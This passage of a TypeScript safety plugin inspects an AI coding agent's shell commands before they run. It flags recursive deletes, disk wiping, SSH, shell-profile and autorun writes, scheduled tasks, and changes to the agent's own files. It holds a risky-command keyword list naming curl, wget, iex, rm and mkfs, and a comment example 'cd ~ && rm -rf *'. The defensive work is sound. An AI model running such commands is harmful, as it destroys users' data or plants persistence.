// SPDX-License-Identifier: Apache-2.0
/**
 * The belt's rules applied to one tool call. Pure: facts that need the disk or git come from the context.
 *
 * Shell commands are analysed into invocations (see shell/analyze.ts) and each invocation is checked in
 * source order, tracking `cd` so that `cd ~ && rm -rf *` is read as deleting the home folder. A target
 * that is only known at run time is never assumed safe.
 */
import { analyzeCommand, type Invocation, psNamed, splitParam } from '../shell/analyze.js';
import type { Dialect, Word } from '../shell/types.js';
import { isUnder, joinPath, pathKey, resolvePath, type PathEnv } from '../paths.js';
import { tIn, type MessageKey } from '../i18n/index.js';
import { truncate } from '../text.js';
import { MARKETPLACE_NAME, PLUGIN_NAME } from '../app.js';
import { scanSecrets } from '../secrets/scan.js';
import { expandVars as expandVarsIn } from '../shell/vars.js';
import { hitsCritical, protectedPaths, under, claudeDir, type ProtectedPaths } from './protect.js';
import { codeLiterals, deletedLiterals } from './inline.js';
import { isProtectedBranch, looksLikeUrl, parseGit, planPush, remoteMatches } from './git.js';
import { outwardKinds, toolWords } from './tool-words.js';
import type { BeltContext, Finding, RuleId } from './types.js';
import type { NetPlan } from '../net.js';
import type { Unit } from '../provenance.js';
import { isLocalHost, sendHosts, sends } from '../taint.js';

/** Issues that hide what runs: always worth asking about. */
const STRONG_UNCERTAIN = new Set(['eval-dynamic', 'encoded-command-undecodable', 'dynamic-shell-code', 'too-deep', 'stdin-code']);
/** Issues that mean the text did not parse cleanly: worth asking about when the command looks risky. */
const WEAK_UNCERTAIN = new Set([
  'unterminated-quote',
  'unterminated-substitution',
  'unterminated-backtick',
  'unterminated-expansion',
  'unterminated-subexpression',
  'unterminated-scriptblock',
  'unterminated-herestring',
  'parser-stuck',
  'unbalanced-paren',
  'unbalanced-bracket',
  'wrapper-string-complex',
  'heredoc-unterminated',
  'expansion-ambiguous',
]);

/** Words whose presence makes an unverifiable command worth asking about. */
const RISKY_WORDS =
  'rm|rmdir|del|erase|rd|remove-item|ri|unlink|shred|rimraf|format|mkfs|dd|diskpart|git|docker|claude|schtasks|crontab|reg|set-content|out-file|clear-content|sed|mv|move|move-item|curl|wget|iex|invoke-expression|chmod|chown|npm|gh|kubectl|terraform|wrangler|firebase|truncate|robocopy|xcopy';
const RISKY_SIGNAL = new RegExp(`(?:^|[^\\w-])(?:${RISKY_WORDS})(?=$|[^\\w-])`, 'i');
/**
 * A program name held in a variable whose value is not known here (set outside the command, or computed).
 * Agents do this all the time for long tool paths, so it is asked about only when its own arguments hold a
 * risky word standing as a word of its own (not a piece of a path such as `.claude/`) or a forcing flag.
 * The other commands around it are checked on their own.
 */
const DYNAMIC_PROGRAM_RISK = new RegExp(
  `(?:^|[\\s;&|(\`'"])(?:${RISKY_WORDS}|prune|purge|wipe)(?=$|[\\s;&|)\`'"])|(?:^|\\s)(?:-[a-z]*(?:rf|fr)[a-z]*|--force|-force|--hard|--delete)(?=$|[\\s=])`,
  'i',
);

const NULL_TARGETS = new Set(['/dev/null', 'nul', '$null', 'nul:', '/dev/stdout', '/dev/stderr']);

/** The Windows auto-start registry keys; separators may already be stripped by bash quoting. */
const RUN_KEY = /currentversion[\\/]*run(?:once)?(?![a-z])/i;

interface Scope {
  ctx: BeltContext;
  paths: ProtectedPaths;
  findings: Finding[];
  inline: boolean;
  /** Set while judging a command that runs inside a WSL distribution (see Invocation.guest). */
  guest?: { distro: string | null; cd: string | null };
}

/** How Windows reaches a WSL distribution's files; a path there is the distribution's, not this machine's. */
const WSL_SHARE = '//wsl.localhost';

/** A path inside a WSL distribution, spelled the way Windows reaches it (`~` stays: the distribution's own home). */
function guestPath(distro: string | null, posix: string): string {
  const out: string[] = [];
  for (const seg of posix.split('/')) {
    if (!seg || seg === '.') continue;
    if (seg === '..') out.pop();
    else out.push(seg);
  }
  return `${WSL_SHARE}/${distro ?? '<default>'}/${out.join('/')}`;
}

/** The folders of a distribution whose deletion destroys it or its user's data: its root, home and system folders. */
function guestCritical(path: string): string | null {
  const m = /^\/\/wsl\.localhost\/[^/]+\/(.*)$/.exec(path);
  if (!m) return null;
  const rest = m[1]!.replace(/\/+$/, '');
  if (rest === '' || rest === '~' || /^(?:home|root|etc|usr|bin|sbin|lib\w*|var|boot|opt|srv|mnt|proc|sys|dev)$/.test(rest) || /^home\/[^/]+$/.test(rest))
    return path;
  return null;
}

function say(s: Scope, key: MessageKey, params?: Record<string, string | number>): string {
  const text = tIn(s.ctx.lang, key, params);
  return s.inline ? tIn(s.ctx.lang, 'belt.reason.inline', { reason: text }) : text;
}

/** A finding; `net` names what a safety net would keep before the call, where the check knows it. */
function add(s: Scope, rule: RuleId, key: MessageKey, params?: Record<string, string | number>, net?: NetPlan): void {
  s.findings.push({ rule, verdict: 'deny', reason: say(s, key, params), ...(net ? { net } : {}) }); // verdict is set from the catalog later
}

/** Names what the last finding added acts on, for the evidence that it is the person's (src/core/provenance.ts). */
function actsOn(s: Scope, unit: Unit | undefined, net?: NetPlan): void {
  const f = s.findings.at(-1);
  if (f && unit && unit.values.every((v) => v.trim())) f.unit = unit;
  if (f && net) f.net = net;
}

/** What a delete would remove, kept whole: a named path, never a pattern still to be matched. */
function pathsNet(t: Target): NetPlan | undefined {
  return t.path !== null && !(t.glob && /[*?[]/.test(t.path)) ? { kind: 'paths', paths: [t.path] } : undefined;
}

function show(p: string): string {
  return truncate(p, 120);
}

// ── paths ─────────────────────────────────────────────────────────────────────────────────────────────

/** Expands $NAME, ${NAME}, %NAME%, $env:NAME from the context; null when something stays unknown. */
export function expandVars(text: string, ctx: BeltContext): string | null {
  return expandVarsIn(text, ctx.home, ctx.env);
}

interface Target {
  path: string | null;
  glob: boolean;
  raw: string;
}

function target(word: { text: string; dynamic: boolean; glob: boolean }, cwd: string | null, s: Scope): Target {
  let text = word.text;
  if (s.guest) {
    // Inside a WSL distribution: its home and absolute paths are its own; /mnt/<drive> is the Windows drive;
    // a relative path is relative to where wsl starts (the Windows folder it mounts), or to --cd.
    text = text.replace(/^\$\{?HOME\}?(?=\/|$)/, '~');
    const drive = /^\/mnt\/([A-Za-z])(\/.*)?$/.exec(text);
    if (drive) text = `${drive[1]!.toUpperCase()}:${drive[2] ?? '/'}`;
    else if (text.startsWith('/') || text.startsWith('~') || s.guest.cd !== null) {
      if (/\$/.test(text)) return { path: null, glob: word.glob, raw: word.text };
      const posix = text.startsWith('/') || text.startsWith('~') ? text : `${s.guest.cd}/${text}`;
      return { path: guestPath(s.guest.distro, posix), glob: word.glob, raw: word.text };
    }
  }
  if (word.dynamic) {
    const e = expandVars(text, s.ctx);
    if (e === null) return { path: null, glob: word.glob, raw: word.text };
    text = e;
  }
  if (cwd === null && !/^(?:[A-Za-z]:[\\/]|[\\/]|~|\$HOME|%USERPROFILE%)/i.test(text)) return { path: null, glob: word.glob, raw: word.text };
  const env: PathEnv = { platform: s.ctx.platform, home: s.ctx.home, cwd: cwd ?? s.ctx.cwd };
  let p = s.paths.canonical(resolvePath(text, env));
  if (word.glob) {
    // A glob deletes matches inside its base folder; a bare * (or .*, *.*, **) empties that folder.
    const segs = p.split('/');
    const gi = segs.findIndex((x) => /[*?[]/.test(x));
    if (gi !== -1) {
      const base = segs.slice(0, gi).join('/') || '/';
      const pattern = segs.slice(gi).join('/');
      const fixedBase = /^[A-Za-z]:$/.test(base) ? base + '/' : base;
      p = /^(?:\*|\.\*|\*\.\*|\*\*|\.?\[\^?\.?\]\*)(?:\/.*)?$/.test(pattern) ? fixedBase : joinPath(fixedBase, pattern);
    }
  }
  return { path: p, glob: word.glob, raw: word.text };
}

function words(inv: Invocation): Word[] {
  return inv.args.map((text, i) => ({ text, dynamic: inv.dynamic[i] ?? false, glob: inv.glob[i] ?? false }));
}

// ── deletion, move, write ─────────────────────────────────────────────────────────────────────────────

function checkDelete(t: Target, recursive: boolean, s: Scope): void {
  const { ctx, paths } = s;
  if (t.path === null) {
    if (recursive) add(s, 'fs.delete-outside-project', 'belt.reason.deleteUnknown', { target: show(t.raw) });
    return;
  }
  const inGuest = guestCritical(t.path);
  if (inGuest) {
    add(s, 'fs.delete-critical', 'belt.reason.deleteProtected', { target: show(t.path) });
    return;
  }
  const crit = hitsCritical(t.path, paths, ctx.platform);
  if (crit) {
    const own = ownProtection(t.path, crit, s);
    if (own) return add(s, own.rule, own.key, { target: show(t.path) });
    const isMemory = under(crit, paths.memoryDirs, ctx.platform);
    const itself = pathKey(t.path, ctx.platform) === pathKey(crit, ctx.platform);
    add(s, isMemory ? 'self.memory-delete' : 'fs.delete-critical', itself ? 'belt.reason.deleteProtected' : 'belt.reason.deleteCritical', {
      target: show(t.path),
      critical: show(crit),
    });
    return;
  }
  const mem = under(t.path, paths.memoryDirs, ctx.platform);
  if (mem) {
    add(s, 'self.memory-delete', 'belt.reason.deleteMemory', { target: show(t.path) });
    // The file by its name, as the person would say it; kept first (the memory's own git history aside).
    actsOn(s, { kind: 'object', values: [t.path.split('/').pop() ?? ''] }, pathsNet(t));
    return;
  }
  if (under(t.path, paths.toolDirs, ctx.platform)) {
    add(s, 'self.tool-files', 'belt.reason.toolFiles', { target: show(t.path) });
    return;
  }
  if (under(t.path, paths.claudeConfig, ctx.platform)) {
    add(s, 'self.claude-settings', 'belt.reason.claudeConfig', { target: show(t.path) });
    return;
  }
  if (under(t.path, paths.tempDirs, ctx.platform)) return;
  const project = paths.canonical(resolvePath(ctx.projectDir, { platform: ctx.platform, home: ctx.home, cwd: ctx.cwd }));
  const gitDir = /\/\.git(?:\/|$)/.test(t.path) && isUnder(t.path, project, ctx.platform);
  if (gitDir && /\/\.git$/.test(t.path)) {
    add(s, 'fs.delete-git-dir', 'belt.reason.deleteGitDir', { target: show(t.path) }, pathsNet(t));
    return;
  }
  if (isUnder(t.path, paths.canonical(claudeDir(ctx)), ctx.platform)) {
    add(s, 'fs.delete-outside-project', 'belt.reason.deleteInClaudeDir', { target: show(t.path) }, pathsNet(t));
    return;
  }
  if (!recursive || insideAProject(t.path, project, ctx, paths)) return;
  if (homeIsProject(project, ctx, paths)) add(s, 'fs.delete-outside-project', 'belt.reason.deleteOutsideProjects', { target: show(t.path) }, pathsNet(t));
  else add(s, 'fs.delete-outside-project', 'belt.reason.deleteOutside', { target: show(t.path), project: show(project) }, pathsNet(t));
  // The path, for whether this session made it (src/core/provenance.ts).
  if (!(t.glob && /[*?[]/.test(t.path))) actsOn(s, { kind: 'path', values: [t.path] });
}

/** A session started in the home folder (or above it) has no project of its own: the home folder is not one. */
function homeIsProject(project: string, ctx: BeltContext, paths: ProtectedPaths): boolean {
  return isUnder(paths.canonical(resolvePath(ctx.home, { platform: ctx.platform, home: ctx.home, cwd: ctx.cwd })), project, ctx.platform);
}

/** Inside the session's project, or strictly inside one of the folders the person registered as projects. */
function insideAProject(path: string, project: string, ctx: BeltContext, paths: ProtectedPaths): boolean {
  if (!homeIsProject(project, ctx, paths) && isUnder(path, project, ctx.platform)) return true;
  return (ctx.knownProjects ?? []).map(paths.canonical).some((p) => isUnder(path, p, ctx.platform) && !isUnder(p, path, ctx.platform));
}

function checkMove(t: Target, s: Scope): void {
  if (t.path === null) return;
  const crit = hitsCritical(t.path, s.paths, s.ctx.platform);
  if (!crit) return;
  const own = ownProtection(t.path, crit, s);
  if (own) add(s, own.rule, own.key, { target: show(t.path) });
  else add(s, 'fs.move-critical', 'belt.reason.moveCritical', { target: show(t.path), critical: show(crit) });
}

/**
 * Deleting or moving the tool's own folder or Claude Code's configuration (the folder itself, not
 * something that merely contains it, such as the home folder) is self-protection, not a critical
 * folder.
 */
function ownProtection(target: string, crit: string, s: Scope): { rule: RuleId; key: MessageKey } | null {
  const { ctx, paths } = s;
  if (pathKey(target, ctx.platform) !== pathKey(crit, ctx.platform)) return null;
  if (under(crit, paths.toolDirs, ctx.platform)) return { rule: 'self.tool-files', key: 'belt.reason.toolFiles' };
  const cdir = paths.canonical(claudeDir(ctx));
  if (pathKey(crit, ctx.platform) === pathKey(cdir, ctx.platform) || under(crit, paths.claudeConfig, ctx.platform))
    return { rule: 'self.claude-settings', key: 'belt.reason.claudeConfig' };
  return null;
}

/** truncate (>), append (>>), replace (cp, Set-Content), edit (sed -i, Edit tool), tool-write (Write tool: memory measured by the caller). */
type WriteKind = 'truncate' | 'append' | 'replace' | 'edit' | 'tool-write';

function checkWrite(t: Target, kind: WriteKind, s: Scope): void {
  const { ctx, paths } = s;
  if (t.path === null) return;
  if (NULL_TARGETS.has(t.raw.toLowerCase()) || NULL_TARGETS.has(t.path.toLowerCase())) return;
  const p = t.path;
  if (under(p, paths.toolDirs, ctx.platform)) return add(s, 'self.tool-files', 'belt.reason.toolFiles', { target: show(p) });
  if (under(p, paths.claudeConfig, ctx.platform)) return add(s, 'self.claude-settings', 'belt.reason.claudeConfig', { target: show(p) });
  if (paths.claudeProjectConfig(p)) return add(s, 'self.claude-settings-project', 'belt.reason.claudeProjectConfig', { target: show(p) });
  if (under(p, [paths.sshDir], ctx.platform)) return add(s, 'persist.ssh', 'belt.reason.ssh', { target: show(p) });
  if (under(p, paths.startupDirs, ctx.platform)) return add(s, 'persist.startup', 'belt.reason.startup', { target: show(p) });
  if (paths.shellProfiles(p)) return add(s, 'persist.shell-profile', 'belt.reason.shellProfile', { target: show(p) });
  if (AUTORUN.test(p)) return add(s, 'persist.autorun', 'belt.reason.autorun', { target: show(p) });
  if (AUTORUN_WIDE.test(p)) {
    add(s, 'persist.autorun', 'belt.reason.autorun', { target: show(p) });
    const f = s.findings.at(-1);
    if (f) f.atMost = 'note';
    return;
  }
  if (under(p, paths.memoryDirs, ctx.platform) && (kind === 'truncate' || kind === 'replace')) {
    add(s, 'self.memory-shrink', 'belt.reason.memoryOverwrite', { target: show(p) });
    actsOn(s, { kind: 'object', values: [p.split('/').pop() ?? ''] }, { kind: 'paths', paths: [p], copy: true });
  }
  if (CHECK_CONFIG.test(p.split('/').pop() ?? '')) add(s, 'quality.check-config', 'belt.reason.checkConfig', { target: show(p) });
}

/** What something more trusted runs later: git's hooks, husky's, direnv's `.envrc` (a launch agent is a startup entry). */
const AUTORUN = /(?:^|\/)(?:\.git\/hooks\/[^/]+|\.husky\/[^/]+|\.envrc)$/i;
/** The broad ring: an editor's tasks, a dev container, CI workflows: run later, by the person's own tools. A note. */
const AUTORUN_WIDE = /(?:^|\/)(?:\.vscode\/tasks\.json|\.devcontainer\/[^/]+|\.github\/workflows\/[^/]+\.ya?ml)$/i;
/** An npm script that runs on install: a package.json carrying one hands its trust to whoever installs. */
const INSTALL_SCRIPT = /"(?:preinstall|install|postinstall|prepare|prepublish)"\s*:/;

/** A test's own files: its folders (test, spec, fixtures, mocks) and files named for it (`a.test.ts`, `a_test.go`). */
const TEST_DATA =
  /(?:^|\/)(?:tests?|__tests__|specs?|fixtures?|__fixtures__|testdata|test-data|mocks?|__mocks__)\/|[._-](?:test|spec)\.[A-Za-z0-9]+$|_test\.go$/i;

/** The settings of a project's linters and formatters, by file name (ESLint, Prettier, Biome, Dart, Stylelint, Ruff, …). */
const CHECK_CONFIG =
  /^(?:\.eslintrc(?:\.(?:js|cjs|mjs|json|ya?ml))?|eslint\.config\.(?:js|cjs|mjs|ts|cts|mts)|\.prettierrc(?:\.(?:js|cjs|mjs|json|json5|ya?ml|toml))?|prettier\.config\.(?:js|cjs|mjs|ts)|biome\.jsonc?|analysis_options\.yaml|\.stylelintrc(?:\.(?:js|cjs|json|ya?ml))?|stylelint\.config\.(?:js|cjs|mjs)|\.golangci\.ya?ml|\.?ruff\.toml|\.flake8|\.pylintrc|\.rubocop\.yml|\.swiftlint\.yml|detekt\.yml)$/i;

// ── per program ───────────────────────────────────────────────────────────────────────────────────────

function positional(ws: Word[], withValue: Set<string> = new Set()): Word[] {
  const out: Word[] = [];
  let rest = false;
  for (let i = 0; i < ws.length; i++) {
    const w = ws[i]!;
    if (rest) {
      out.push(w);
      continue;
    }
    if (w.text === '--') {
      rest = true;
      continue;
    }
    if (w.text.startsWith('-') && w.text !== '-') {
      if (withValue.has(w.text)) i++;
      continue;
    }
    out.push(w);
  }
  return out;
}

function hasShortFlag(ws: Word[], letters: string, longs: string[]): boolean {
  return ws.some(
    (w) => (w.text.startsWith('-') && !w.text.startsWith('--') && [...letters].some((l) => w.text.slice(1).includes(l))) || longs.includes(w.text),
  );
}

function psParam(ws: Word[], full: string): Word | undefined | true {
  for (let i = 0; i < ws.length; i++) {
    const w = ws[i]!;
    if (!w.text.startsWith('-')) continue;
    const [name, inline] = splitParam(w.text);
    if (name.length && full.startsWith(name)) return inline !== undefined ? { ...w, text: inline } : (ws[i + 1] ?? true);
  }
  return undefined;
}

function psSwitch(ws: Word[], full: string, minLen = 1): boolean {
  return ws.some((w) => {
    if (!w.text.startsWith('-')) return false;
    const [name, inline] = splitParam(w.text);
    return name.length >= minLen && full.startsWith(name) && inline !== '$false';
  });
}

/** Comma-separated PowerShell path lists: -Path a,b. */
function psPaths(w: Word | undefined | true): Word[] {
  if (!w || w === true) return [];
  return w.text
    .split(',')
    .map((t) => ({ ...w, text: t.trim() }))
    .filter((x) => x.text);
}

async function checkInvocation(inv: Invocation, cwd: string | null, s0: Scope, dialect: Dialect): Promise<void> {
  // A command for a WSL distribution, typed on Windows, is judged with the distribution's paths.
  const s: Scope = inv.guest && s0.ctx.platform === 'win32' ? { ...s0, guest: inv.guest } : s0;
  const ws = words(inv);
  const p = inv.program;
  const lower = (i: number) => (inv.args[i] ?? '').toLowerCase();

  inv.writes.forEach((w, i) =>
    checkWrite(target({ text: w, dynamic: inv.writeDynamic[i] ?? false, glob: false }, cwd, s), inv.writeAppend[i] ? 'append' : 'truncate', s),
  );

  switch (p) {
    case 'rm':
    case 'unlink':
    case 'shred':
    case 'rimraf':
    case 'trash-put': {
      if (p === 'shred' && !hasShortFlag(ws, 'u', ['--remove'])) break;
      const recursive = p === 'rimraf' || hasShortFlag(ws, 'rR', ['--recursive']);
      for (const w of positional(ws)) checkDelete(target(w, cwd, s), recursive || w.glob, s);
      break;
    }
    case 'find': {
      if (
        !ws.some(
          (w) => w.text === '-delete' || ((w.text === '-exec' || w.text === '-execdir') && /^(rm|shred|unlink)$/.test(ws[ws.indexOf(w) + 1]?.text ?? '')),
        )
      )
        break;
      const firstExpr = ws.findIndex((w) => w.text.startsWith('-') || w.text === '(' || w.text === '!');
      const starts = (firstExpr === -1 ? ws : ws.slice(0, firstExpr)).filter((w) => !w.text.startsWith('-'));
      // With a test (-name, -type, -mtime, …) find deletes matches inside the start, not the start itself.
      const filtered = ws.some((w) =>
        /^-(?:i?name|i?path|i?wholename|i?regex|type|x?type|mtime|mmin|atime|amin|ctime|cmin|newer\w*|size|empty|user|group|perm|links|samefile|uid|gid|inum|fstype)$/.test(
          w.text,
        ),
      );
      for (const w of starts.length ? starts : [{ text: '.', dynamic: false, glob: false }]) {
        const t = target(w, cwd, s);
        checkDelete(filtered && t.path ? { ...t, path: joinPath(t.path, '…matches') } : t, true, s);
      }
      break;
    }
    case 'remove-item': {
      if (psSwitch(ws, 'whatif', 2)) break;
      const named = psNamed(ws, { path: 'Path', literalpath: 'LiteralPath' }, ['path']);
      const recursive = psSwitch(ws, 'recurse', 1);
      for (const w of [...psPaths(named.path), ...psPaths(named.literalpath)]) checkDelete(target(w, cwd, s), recursive || w.glob, s);
      break;
    }
    case 'del':
    case 'erase':
    case 'rd':
    case 'rmdir': {
      if (dialect !== 'cmd' && p === 'rmdir') break; // POSIX rmdir only removes empty folders
      const flags = ws.filter((w) => w.text.startsWith('/')).map((w) => w.text.toLowerCase());
      const recursive = flags.some((f) => f.startsWith('/s'));
      for (const w of ws.filter((x) => !x.text.startsWith('/'))) checkDelete(target(w, cwd, s), recursive, s);
      break;
    }
    case '[system.io.directory]::delete':
    case '[io.directory]::delete':
      if (ws[0]) checkDelete(target(ws[0], cwd, s), /^\$true$/i.test(ws[1]?.text ?? ''), s);
      break;
    case '[system.io.file]::delete':
    case '[io.file]::delete':
      if (ws[0]) checkDelete(target(ws[0], cwd, s), false, s);
      break;
    case '[system.io.file]::writealltext':
    case '[system.io.file]::writealllines':
    case '[system.io.file]::writeallbytes':
    case '[io.file]::writealltext':
    case '[io.file]::writealllines':
    case '[io.file]::writeallbytes':
      if (ws[0]) checkWrite(target(ws[0], cwd, s), 'replace', s);
      break;
    case '[system.io.file]::appendalltext':
    case '[system.io.file]::appendalllines':
    case '[io.file]::appendalltext':
    case '[io.file]::appendalllines':
      if (ws[0]) checkWrite(target(ws[0], cwd, s), 'append', s);
      break;
    case '[system.io.file]::copy':
    case '[system.io.file]::move':
    case '[io.file]::copy':
    case '[io.file]::move':
      if (ws[1]) checkWrite(target(ws[1], cwd, s), 'replace', s);
      if (p.endsWith('move') && ws[0]) checkMove(target(ws[0], cwd, s), s);
      break;
    case 'robocopy': {
      const flags = ws.filter((w) => w.text.startsWith('/')).map((w) => w.text.toLowerCase());
      const pos = ws.filter((w) => !w.text.startsWith('/'));
      if ((flags.includes('/mir') || flags.includes('/purge')) && pos[1]) checkDelete(target(pos[1], cwd, s), true, s);
      if (pos[1]) checkWrite(target(pos[1], cwd, s), 'replace', s);
      break;
    }
    case 'mv':
    case 'move-item':
    case 'move':
    case 'ren':
    case 'rename-item': {
      let srcs: Word[];
      let dest: Word | undefined;
      if (p === 'move-item' || p === 'rename-item') {
        const named = psNamed(ws, { path: 'Path', literalpath: 'LiteralPath', destination: 'Destination', newname: 'NewName' }, [
          'path',
          p === 'move-item' ? 'destination' : 'newname',
        ]);
        srcs = [...psPaths(named.path), ...psPaths(named.literalpath)];
        dest = p === 'move-item' ? named.destination : undefined;
      } else {
        const pos =
          p === 'move' || p === 'ren' ? ws.filter((w) => !w.text.startsWith('/')) : positional(ws, new Set(['-t', '-S', '--suffix', '--target-directory']));
        const tFlag = ws.findIndex((w) => w.text === '-t' || w.text.startsWith('--target-directory'));
        if (tFlag !== -1) {
          dest = ws[tFlag]!.text.includes('=') ? { ...ws[tFlag]!, text: ws[tFlag]!.text.split('=')[1]! } : ws[tFlag + 1];
          srcs = pos;
        } else {
          srcs = p === 'ren' ? pos.slice(0, 1) : pos.slice(0, -1);
          dest = p === 'ren' ? undefined : pos[pos.length - 1];
        }
      }
      for (const w of srcs) {
        const t = target(w, cwd, s);
        checkMove(t, s);
        if (t.path && under(t.path, s.paths.memoryDirs, s.ctx.platform)) {
          const d = dest ? target(dest, cwd, s) : null;
          if (!d?.path || !under(d.path, s.paths.memoryDirs, s.ctx.platform))
            add(s, 'self.memory-delete', 'belt.reason.moveMemoryOut', { target: show(t.path) });
        }
        if (t.path && (under(t.path, s.paths.toolDirs, s.ctx.platform) || under(t.path, s.paths.claudeConfig, s.ctx.platform))) checkWrite(t, 'replace', s);
      }
      if (dest) {
        const d = target(dest, cwd, s);
        // Reorganising inside the memory folder (archiving a note) is not an overwrite of memory.
        const withinMemory =
          d.path !== null &&
          under(d.path, s.paths.memoryDirs, s.ctx.platform) &&
          srcs.every((w) => {
            const t = target(w, cwd, s);
            return t.path !== null && under(t.path, s.paths.memoryDirs, s.ctx.platform);
          });
        checkWrite(d, withinMemory ? 'edit' : 'replace', s);
      }
      break;
    }
    case 'cp':
    case 'copy-item':
    case 'copy':
    case 'xcopy':
    case 'install':
    case 'ln': {
      let dest: Word | undefined;
      if (p === 'copy-item') dest = psNamed(ws, { path: 'Path', destination: 'Destination' }, ['path', 'destination']).destination;
      else {
        const pos =
          p === 'copy' || p === 'xcopy'
            ? ws.filter((w) => !w.text.startsWith('/'))
            : positional(ws, new Set(['-t', '-S', '--suffix', '-m', '--mode', '-o', '-g', '--target-directory']));
        const tFlag = ws.findIndex((w) => w.text === '-t' || w.text.startsWith('--target-directory'));
        dest = tFlag !== -1 ? (ws[tFlag]!.text.includes('=') ? { ...ws[tFlag]!, text: ws[tFlag]!.text.split('=')[1]! } : ws[tFlag + 1]) : pos[pos.length - 1];
        if (pos.length < 2 && tFlag === -1) dest = undefined;
      }
      if (dest) checkWrite(target(dest, cwd, s), 'replace', s);
      break;
    }
    case 'tee':
    case 'tee-object': {
      const append = hasShortFlag(ws, 'a', ['--append']) || psSwitch(ws, 'append', 2);
      const files =
        p === 'tee'
          ? positional(ws)
          : psPaths(psNamed(ws, { filepath: 'FilePath', literalpath: 'LiteralPath', path: 'Path' }, ['filepath']).filepath as Word | undefined);
      for (const w of files) checkWrite(target(w, cwd, s), append ? 'append' : 'truncate', s);
      break;
    }
    case 'sed':
    case 'perl': {
      if (!ws.some((w) => /^-i/.test(w.text) || w.text === '--in-place' || w.text.startsWith('--in-place='))) break;
      const hasScript = ws.some((w) => w.text === '-e' || w.text === '-f' || w.text === '--expression' || w.text === '-pe' || w.text === '-ne');
      const pos = positional(ws, new Set(['-e', '-f', '--expression', '--file', '-pe', '-ne']));
      for (const w of hasScript ? pos : pos.slice(1)) checkWrite(target(w, cwd, s), 'edit', s);
      break;
    }
    case 'truncate':
      for (const w of positional(ws, new Set(['-s', '--size', '-r', '--reference']))) checkWrite(target(w, cwd, s), 'truncate', s);
      break;
    case 'dd': {
      const of = ws.find((w) => w.text.startsWith('of='));
      if (of) {
        const dev = of.text.slice(3);
        if (/^\/dev\/(?!null|zero|stdout|stderr|tty)/.test(dev) || /^\\\\\.\\/.test(dev)) add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
        else checkWrite(target({ ...of, text: dev }, cwd, s), 'replace', s);
      }
      break;
    }
    case 'set-content':
    case 'add-content':
    case 'out-file':
    case 'clear-content':
    case 'new-item': {
      if (p === 'new-item' && !psSwitch(ws, 'force', 2) && !psParam(ws, 'value')) break;
      const named = psNamed(ws, { path: 'Path', literalpath: 'LiteralPath', filepath: 'FilePath' }, [p === 'out-file' ? 'filepath' : 'path']);
      const kind: WriteKind = p === 'add-content' || psSwitch(ws, 'append', 2) ? 'append' : p === 'clear-content' ? 'truncate' : 'replace';
      for (const w of [...psPaths(named.path), ...psPaths(named.literalpath), ...psPaths(named.filepath)]) checkWrite(target(w, cwd, s), kind, s);
      break;
    }
    case 'curl':
    case 'wget': {
      const flag = p === 'curl' ? ['-o', '--output'] : ['-O', '--output-document'];
      const i = ws.findIndex((w) => flag.includes(w.text));
      if (i !== -1 && ws[i + 1]) checkWrite(target(ws[i + 1]!, cwd, s), 'replace', s);
      break;
    }
    case 'git':
      await checkGit(inv, ws, cwd, s);
      break;
    case 'claude':
      checkClaude(ws, s);
      break;
    case 'mkfs':
    case 'diskpart':
    case 'fdisk':
    case 'sfdisk':
    case 'parted':
    case 'wipefs':
    case 'clear-disk':
    case 'format-volume':
    case 'remove-partition':
    case 'initialize-disk':
      add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
      break;
    case 'format':
      if (dialect === 'cmd' || /^[A-Za-z]:$/.test(inv.args[0] ?? '')) add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
      break;
    case 'cipher':
      if (ws.some((w) => /^\/w/i.test(w.text))) add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
      break;
    case 'diskutil':
      if (/^(erase|zero|partition|secureerase|reformat)/i.test(inv.args[0] ?? '')) add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
      break;
    case 'schtasks':
      if (ws.some((w) => /^[/-](create|change)$/i.test(w.text))) add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'register-scheduledtask':
    case 'set-scheduledtask':
    case 'new-service':
      add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'crontab':
      if (!ws.every((w) => w.text === '-l' || w.text.startsWith('-u')))
        add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'at':
    case 'batch':
      if (ws.length && !ws.some((w) => w.text === '-l' || w.text === '-r' || w.text === '-d'))
        add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'launchctl':
      if (/^(load|bootstrap|enable|submit)$/.test(lower(0))) add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'systemctl':
      if (ws.some((w) => /^(enable|link|edit|preset|reenable)$/.test(w.text)))
        add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'sc':
      if (dialect !== 'powershell' && /^(create|config)$/.test(lower(0)))
        add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'reg':
      if (/^(add|import|copy)$/.test(lower(0)) && ws.some((w) => RUN_KEY.test(w.text)))
        add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'set-itemproperty':
    case 'new-itemproperty':
      if (ws.some((w) => RUN_KEY.test(w.text))) add(s, 'persist.scheduled-task', 'belt.reason.scheduledTask', { command: show(inv.raw) });
      break;
    case 'docker':
    case 'docker-compose':
    case 'podman':
      checkDocker(p, ws, inv.raw, s);
      break;
    default:
      if (/^mkfs(\.|$)/.test(p) || /^newfs/.test(p)) add(s, 'fs.disk', 'belt.reason.disk', { command: show(inv.raw) });
      else checkPublish(p, ws, inv.raw, s);
  }
  checkData(inv, s);
  checkSecurityOff(inv, dialect, s);
  checkExfil(inv, ws, s);
  checkNetwork(inv, s);
  checkAgents(inv, s);
  if (p === 'gh') checkGitHub(inv, s);

  if (inv.inlineCode) await checkInlineCode(inv, cwd, s);
}

async function checkGit(inv: Invocation, ws: Word[], cwd: string | null, s: Scope): Promise<void> {
  const { ctx, paths } = s;
  const env: PathEnv = { platform: ctx.platform, home: ctx.home, cwd: cwd ?? ctx.cwd };
  let call = parseGit(inv.args, inv.dynamic, env);
  const cfg = ctx.config;
  // Aliases: `git p` may be `git push --force`.
